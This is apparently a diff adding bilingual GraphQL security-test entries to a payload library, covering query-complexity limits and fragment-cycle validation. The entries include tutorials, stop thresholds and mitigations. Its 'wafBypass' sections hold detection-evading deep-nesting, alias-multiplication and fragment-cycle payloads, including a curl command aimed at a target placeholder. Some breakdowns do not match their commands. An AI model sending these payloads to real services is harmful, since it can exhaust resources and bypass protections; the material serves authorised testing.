+     "payload": ""
+    }
+   ],
+   "references": [
+    "https://graphql.org/learn/security/",
+    "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+   ],
+   "analysis": {
+    "zh": "原样例只能证明查询复杂度控制行为，不能单独证明 DoS。有效发现需要在批准阈值内显示成本未受限、资源随单一变量非线性增长或正常请求明显受影响。",
+    "en": "The source probes show query-complexity control behavior, not denial of service by themselves. A valid finding requires unbounded cost, nonlinear resource growth from one variable, or measurable impact on normal requests within approved limits."
+   },
+   "opsecTips": [
+    {
+     "zh": "只在隔离副本串行递增，达到 CPU、延迟或 resolver 阈值立即停止。",
+     "en": "Increase load serially only in an isolated copy and stop at CPU, latency, or resolver thresholds."
+    },
+    {
+     "zh": "不使用并发放大、无限分页或持续请求来制造服务不可用。",
+     "en": "Do not use concurrency amplification, unbounded pagination, or sustained requests to cause unavailability."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "原始 GraphQL 文档是有界复杂度探针；纠正了直接宣称 DoS 的过度结论，保留为资源控制验证 Payload。",
+    "issuesResolved": [
+     "corrected-name",
+     "corrected-overclaim",
+     "added-stop-thresholds",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "变量化深度查询",
+      "en": "Variable-Masked Depth Query"
+     },
+     "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"{...F __typename ...on Query{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename}}}}} fragment F on Query{__typename}\"}' --compressed",
+     "description": {
+      "zh": "压缩传输与混合片段降低深度特征可检性。成功判据：深嵌套查询被接受执行。",
+      "en": "Compressed transport and mixed fragments lower depth detectability. Success: the deeply nested query is accepted and executed."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "--compressed",
+       "explanation": {
+        "zh": "压缩传输标志",
+        "en": "Compressed transfer flag"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "{__typename ...on Query{__typename ...on Query{__typename}}}}} {a1:a{b1:b{c1:c}}}",
+       "explanation": {
+        "zh": "混合片段深嵌套载荷",
+        "en": "Mixed-fragment deep payload"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "\"variables\":{}",
+       "explanation": {
+        "zh": "空变量对象",
+        "en": "Empty variables object"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "片段指数复制",
+      "en": "Exponential Fragment Replication"
+     },
+     "command": "query{...A ...A ...A ...A} fragment A on Query{...B ...B ...B} fragment B on Query{friends{...C}} fragment C on User{secretToken}",
+     "description": {
+      "zh": "片段多处展开实现指数级查询体积绕过文档大小限制。成功判据：服务器解析耗时显著上升或超时。",
+      "en": "Expanding fragments at multiple sites achieves exponential document size past size limits. Success: server parse time spikes or times out."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{...A ...A ...A ...A}",
+       "explanation": {
+        "zh": "片段多次展开",
+        "en": "Fragment spread repetition"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment B on Query{friends{...C}}",
+       "explanation": {
+        "zh": "二级片段嵌套",
+        "en": "Second-level fragment"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment C on User{secretToken}",
+       "explanation": {
+        "zh": "末级敏感片段",
+        "en": "Leaf sensitive fragment"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "别名同字段倍增",
+      "en": "Aliased Same-Field Multiplication"
+     },
+     "command": "query{u1:users{id email} u2:users{id email} u3:users{id email} u4:users{id email} u5:users{id email} u6:users{id email} u7:users{id email} u8:users{id email}}",
+     "description": {
+      "zh": "同字段多别名绕过字段计数型复杂度估算。成功判据：单请求触发资源告警或延迟。",
+      "en": "Multiple aliases of one field bypass field-count complexity estimation. Success: one request triggers resource alerts or latency."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{u1:users{id email}",
+       "explanation": {
+        "zh": "同字段多别名",
+        "en": "Same field, many aliases"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "u8:users{id email}}",
+       "explanation": {
+        "zh": "第八别名查询",
+        "en": "Eighth alias query"
+       },
+       "type": "payload"
+      }
+     ]
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "深度嵌套与别名复杂度探针",
+      "en": "Validation step 1 for GraphQL Query Complexity Limit Validation"
+     },
+     "command": "{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename}}}}}}\n{a:__typename ...on Query{b:__typename ...on Query{c:__typename ...on Query{d:__typename ...on Query{e:__typename ...on Query{f:__typename ...on Query{g:__typename ...on Query{h:__typename ...on Query{i:__typename ...on Query{j:__typename}}}}}}}}}}\nquery{user{id friends{id friends{id friends{id friends{id friends{id friends{id}}}}}}}}\nquery{me{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{id email}}}}}}}}}}}\nquery{a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename a11:__typename a12:__typename a13:__typename a14:__typename a15:__typename a16:__typename a17:__typename a18:__typename a19:__typename a20:__typename}",
+     "description": {
+      "zh": "把深嵌套、别名与宽分页查询逐条提交；响应时间激增或服务端拒绝缺失即确认成本限制边界。",
+      "en": "Submit each deeply nested, aliased, or wide-paged query; response-time spikes or missing server rejection confirm the cost-limit boundary."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename",
+       "explanation": {
+        "zh": "内联片段深嵌套",
+        "en": "Deep inline nesting"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "query{user{id friends{id friends{id friends{id friends{id",
+       "explanation": {
+        "zh": "关系递归嵌套",
+        "en": "Recursive relation nesting"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "query{a1:__typename a2:__typename",
+       "explanation": {
+        "zh": "类型名别名堆叠",
+        "en": "Typename alias stacking"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{__typename",
+       "explanation": {
+        "zh": "类型名字段",
+        "en": "Typename field"
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2",
+    "dos"
+   ]
+  },
+  {
+   "id": "api2-fragment",
+   "name": {
+    "zh": "GraphQL Fragment 循环校验",
+    "en": "GraphQL Fragment-Cycle Validation"
+   },
+   "description": {
+    "zh": "验证 GraphQL 文档验证器是否在执行前拒绝直接或间接 Fragment 循环；规范要求 Fragment 展开图不得形成环，因此这些样例主要是验证阶段负对照。",
+    "en": "Validate whether the GraphQL document validator rejects direct and indirect fragment cycles before execution. The specification requires an acyclic fragment-spread graph, so these samples are primarily validation-stage negative controls."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "批量查询与资源滥用",
+    "en": "Batch Queries & Resource Abuse"
+   },
+   "prerequisites": [
+    {
+     "zh": "可查看解析、验证和执行阶段日志，并准备一个合法 Fragment 查询作为对照。",
+     "en": "Parsing, validation, and execution-stage logs are observable, and a valid fragment query is prepared as a control."
+    },
+    {
+     "zh": "测试环境设置严格请求超时和单次请求资源停止阈值。",
+     "en": "The test environment has strict request timeouts and per-request resource stop thresholds."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL Fragment 循环校验场景，检验文档验证器对直接与间接循环引用的执行前拒绝。验证维度为自引用与跨片段循环的负对照矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL fragment-cycle validation, testing pre-execution rejection of direct and indirect circular references. Validation is a negative-control matrix of self-references and cross-fragment cycles, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于文档验证器未按规范构建片段展开图：循环引用若被接受进入执行将耗尽解析栈，异常处理路径还可能进一步泄露内部实现细节信息。",
+     "en": "The root cause is document validators failing to build fragment-expansion graphs per spec: accepted cycles entering execution exhaust parse stacks, and exception paths may further leak internal implementation details."
+    },
+    "exploitation": {
+     "zh": "第 1 步按脚本把直接与间接循环 fragment 文档逐条提交并记录服务端决策：循环被接受进入执行或引发栈异常即确认文档验证缺失，同时核对错误响应是否泄露堆栈信息；若验证阶段快速返回规范错误且未调用业务 resolver，则属正常拒绝。",
+     "en": "In step 1, submit direct and indirect fragment-cycle documents one by one per the script, recording server decisions; accepted cycles or stack exceptions confirm missing document validation, with error responses checked for stack leakage. Judge success by rejections and error structure. Replace placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "校验阶段构建片段展开图并拒绝一切循环引用，错误响应统一脱敏不返回内部细节。修复后重放第 1 步矩阵，全部循环文档应在验证层被拒绝。",
+     "en": "Build fragment-expansion graphs at validation rejecting all cycles, sanitizing error responses of internal details. After the fix, replay the step 1 matrix: every cyclic document should be rejected at validation."
+    },
+    "difficulty": "intermediate"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "验证合法 Fragment 基线",
+      "en": "Validate a legal-fragment baseline"
+     },
+     "description": {
+      "zh": "提交无环 Fragment，记录正常验证、执行和 resolver 调用路径。",
+      "en": "Submit an acyclic fragment and record normal validation, execution, and resolver-call paths."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "串行提交循环文档",
+      "en": "Submit cyclic documents serially"
+     },
+     "description": {
+      "zh": "逐条重放原始直接和间接循环样例，不增加并发或文档规模。",
+      "en": "Replay the original direct and indirect cycle samples one at a time without increasing concurrency or document size."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "确认验证阶段终止",
+      "en": "Confirm validation-stage termination"
+     },
+     "description": {
+      "zh": "核对明确错误、零业务 resolver 调用和稳定资源，区分正常拒绝与实现递归。",
+      "en": "Check for explicit errors, zero business resolver calls, and stable resources to distinguish normal rejection from implementation recursion."
+     },
+     "payload": "query{users{...X}} fragment X on User{friends{...Y}} fragment Y on User{friends{...X2}} fragment X2 on User{friends{...Y}}"
+    },
+    {
+     "title": {
+      "zh": "统一验证入口并回归",
+      "en": "Unify validation entry points and regress"
+     },
+     "description": {
+      "zh": "修复或升级验证器后覆盖 HTTP、WebSocket 和后台执行入口，确认循环均在执行前拒绝。",
+      "en": "After repairing or upgrading validation, cover HTTP, WebSocket, and background execution entry points and confirm every cycle is rejected before execution."
+     },
+     "payload": ""
+    }
+   ],
+   "references": [
+    "https://spec.graphql.org/October2021/#sec-Fragment-spreads-must-not-form-cycles",
+    "https://spec.graphql.org/October2021/#sec-Validation"
+   ],
+   "analysis": {
+    "zh": "快速返回规范验证错误且不进入 resolver 是通过结果，不是漏洞。只有循环导致验证器无界递归、异常资源消耗或影响正常请求，才需要按实现缺陷报告。",
+    "en": "A fast specification validation error with no resolver execution is a pass, not a vulnerability. Report only unbounded validator recursion, abnormal resource use, or measurable impact on normal requests."
+   },
+   "opsecTips": [
+    {
+     "zh": "逐条单次发送并观察验证器指标，不构造更大的循环图或并发压力。",
+     "en": "Send each sample once while observing validator metrics; do not construct larger cycle graphs or concurrent pressure."
+    },
+    {
+     "zh": "出现超时、堆栈异常或资源快速上升时立即停止并保存日志。",
+     "en": "Stop immediately and preserve logs on timeout, stack anomalies, or rapidly rising resource use."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "原始文档是 GraphQL Fragment 循环验证负对照；修正了将规范拒绝误写为攻击成功的问题。",
+    "issuesResolved": [
+     "corrected-name",
+     "corrected-technical-claim",
+     "documented-negative-control",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "嵌套片段深度",
+      "en": "Nested Fragment Depth"
+     },
+     "command": "query{...A} fragment A on Query{...B} fragment B on Query{...C} fragment C on Query{...D} fragment D on Query{...A}",
+     "description": {
+      "zh": "把循环拉长为多跳链，绕过只检查直接回边或浅层深度的循环检测实现。成功判据：更长长度的循环文档未被验证阶段拒绝，进入执行或引发栈溢出、挂起等异常。",
+      "en": "Chained nested fragments bypass single-level cycle detection. Success: the deep chain expands and executes."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{...A} fragment A on Query{...B}",
+       "explanation": {
+        "zh": "链式片段开头",
+        "en": "Chain start"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment D on Query{friends{id}}",
+       "explanation": {
+        "zh": "链尾实体片段",
+        "en": "Chain leaf fragment"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "双向环变形",
+      "en": "Bidirectional Cycle Mutation"
+     },
+     "command": "query{users{...X}} fragment X on User{friends{...Y}} fragment Y on User{friends{...X2}} fragment X2 on User{friends{...Y}}",
+     "description": {
+      "zh": "引入第三片段打断直接 A→B→A 检测模式。成功判据：循环未被拒绝并展开。",
+      "en": "Introducing a third fragment breaks direct A→B→A detection. Success: the cycle is not rejected and expands."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "fragment X on User{friends{...Y}} fragment Y on User{friends{...X2}}",
+       "explanation": {
+        "zh": "三片段打断环",
+        "en": "Three-fragment broken ring"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment X2 on User{friends{...Y}}",
+       "explanation": {
+        "zh": "别名片段回环",
+        "en": "Aliased fragment ring"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "大小写与名称混淆",
+      "en": "Case & Name Confusion"
+     },
+     "command": "query{...a} fragment a on Query{...B} fragment B on Query{...c} fragment c on Query{...a} \n query{...A} fragment A on Query{...b} fragment b on Query{...A}",
+     "description": {
+      "zh": "大小写与名称混淆 — 用大小写混合的随机化片段名，规避依赖固定名称对（如 ...A 与 fragment A 成对出现）的签名/正则类粗粒度循环检测。成功判据：随机命名的循环链未被验证阶段拒绝，进入执行或引发栈错误。",
+      "en": "Case-alternating fragment names bypass duplicate detection applied before normalization. Success: the confused chain is accepted and expands."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{...a} fragment a on Query{...B}",
+       "explanation": {
+        "zh": "小写开头混淆链",
+        "en": "Lowercase-start confusion"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment b on Query{__typename}",
+       "explanation": {
+        "zh": "大小写交替尾片段",
+        "en": "Case-alternating leaf"
+       },
+       "type": "payload"
+      }
+     ]
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "Fragment循环引用",
+      "en": "Validation step 1 for GraphQL Fragment-Cycle Validation"
+     },
+     "command": "query{...A} fragment A on Query{...B} fragment B on Query{...A} \n query{...X} fragment X on Query{users{...Y}} fragment Y on User{friends{...X}} \n query{...M} fragment M on Query{users{...N}} fragment N on User{friends{...M}} \n query{...P} fragment P on Query{...Q} fragment Q on Query{...R} fragment R on Query{...P} \n query{...Self} fragment Self on Query{...Self} \n query{...Loop} fragment Loop on Query{users{...Loop}} \n query{...Bomb} fragment Bomb on Query{users{...Bomb}}",
+     "description": {
+      "zh": "把循环 fragment 文档逐条提交：服务端接受文档并进入执行、或处理中出现栈溢出、崩溃、资源骤增等异常，即确认文档验证缺失；验证阶段快速返回规范验证错误且未调用业务 resolver 的，属正常拒绝，不计为发现。",
+      "en": "Submit each cyclic fragment document; the server accepting or mishandling cycles confirms missing document validation."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{...A} fragment A on Query{...B} fragment B on Query{...A}",
+       "explanation": {
+        "zh": "A-B 互引循环",
+        "en": "A-B mutual cycle"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment Self on Query{...Self}",
+       "explanation": {
+        "zh": "自引用片段",
+        "en": "Self-referencing fragment"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment Loop on User{friends{...Loop}}",
+       "explanation": {
+        "zh": "关系循环片段",
+        "en": "Relation-loop fragment"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "query{...P} fragment P on Query{...Q} fragment Q on Query{...R} fragment R on Query{...P}",
+       "explanation": {
+        "zh": "三段循环链",
+        "en": "Three-fragment cycle"
+       },
+       "type": "payload"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2",
+    "fragment"
+   ]
+  }
+ ]
 }
